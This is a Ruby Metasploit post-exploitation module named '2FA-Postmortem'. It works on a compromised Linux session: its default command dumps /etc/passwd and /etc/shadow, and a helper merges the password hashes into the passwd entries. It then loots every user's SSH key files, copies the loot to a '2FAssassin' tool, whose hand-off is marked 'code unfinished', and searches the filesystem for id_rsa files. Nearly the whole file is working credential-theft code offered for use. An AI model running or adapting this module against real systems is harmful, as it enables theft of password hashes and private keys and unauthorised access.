##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'rex'
require 'sshkey'
require 'fileutils'
require "find"

class MetasploitModule < Msf::Post

 include Msf::Post::File
 include Msf::Post::Unix


 def initialize(info={})
   super(update_info(info,
     'Name' => '2FA-Postmortem',
     'Description' => %q{
       Parse meterpreter session to 2FAssassin. There is no need to run 2FAassasin separately. Disregard which method you applied to exploit into the target system, you can always bring the Meterpreter session back to the 2FAssassin instance.
     },
     'License' => MSF_LICENSE,
     'Author' => [ 'Maxwell Koh' ],
     'Platform' => [ 'linux' ],
     'Arch' => [ 'x86' ],
     'SessionTypes' => [ 'meterpreter', 'shell' ],
 ))

 register_options(
 [

   OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ]),
   OptString.new('CMDEXEC', [ true, 'Command to execute', 'echo -e "\n---------- display passwd file ----------\n";cat /etc/passwd;echo -e "\n\n\n---------- display shadow file ----------\n";cat /etc/shadow;echo -e ""' ]),
 ], self.class)
 end

 def run
   systeminfo = datastore['SYSTEMINFO']
   cmdexec = datastore['CMDEXEC']
   print_status('Parsing Meterpreter Session to the 2FAssassin instance...')
   print_line('')
   if systeminfo == TRUE
   print_good("OS: #{session.sys.config.sysinfo['OS']}")
   print_good("Computer name: #{'Computer'} ")
   print_good("Current user: #{session.sys.config.getuid}")
   print_line('')
   end

   print_line('')

   command_output = cmd_exec(cmdexec)
   print_line(command_output)
   print_line('')

   print_status("Searching for any potential keys")
   paths = enum_user_directories.map {|d| d + "/.ssh"}
   paths = paths.select { |d| directory?(d) }

   if paths.nil? or paths.empty?
     print_error("No users found with a .ssh directory")
     return
   end

   retrieve_key(paths)
 end

def reveal(pf,sf)
    reveal = ""
    sf.each_line do |sl|
      pass = sl.scan(/^\w*:([^:]*)/).join
      if pass !~ /^\*|^!$/
        user = sl.scan(/(^\w*):/).join
        pf.each_line do |pl|
          if pl.match(/^#{user}:/)
            reveal << pl.gsub(/:x:/,":#{pass}:")
          end
        end
      end
    end

    reveal
  end

  def retrieve_key(paths)
    print_status("Found #{paths.count} directories that contain potential keys")
    paths.each do |path|
      path.chomp!
      if session.type == "meterpreter"
        sep = session.fs.file.separator
        files = session.fs.dir.entries(path)
      else
        sep = "/"
        files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
      end
      path_array = path.split(sep)
      path_array.pop
      user = path_array.pop
      files.each do |file|
        next if [".", ".."].include?(file)
        data = read_file("#{path}#{sep}#{file}")
        file = file.split(sep).last

        loot_path = store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
        print_good("Extracted key: #{path}#{sep}#{file} -> #{loot_path}")

      end

      print_status("Parsing looted information to the 2FAssassin instance")
      FileUtils.cp_r "/root/.msf4/loot/.", "/root/2fassassin/loot/"
      print_status("Starting 2FAssassin now")
     # not yet finish here
     # code unfinished
     # code unfinished
     # code unfinished

      print_status ("Show all keys found on local system:")
      folder="/"
      Find.find(folder) do |file|
        puts" ----------------------------------------------   #{file}" if file=~/\id_rsa/
      end
    end
  end

  puts ""
  puts "
     _                   _
   _( )                 ( )_
  (_, |      __ __      | ,_)
     |'|    /  ^  |    /'/
      '|'|,/|      |,/'/'
        '|| []   [] |/'
          (_  /^|  _)
            |  ~  /
            /HHHHH|
          /'/{^^^}|'|
      _,/'/'  ^^^  '|'|,_
     (_, |           | ,_)
       (_)           (_)
  "
  puts "       +----------------+"
  puts "       | 2FA-Postmortem |"
  puts "       +----------------+"
  puts ""

 end
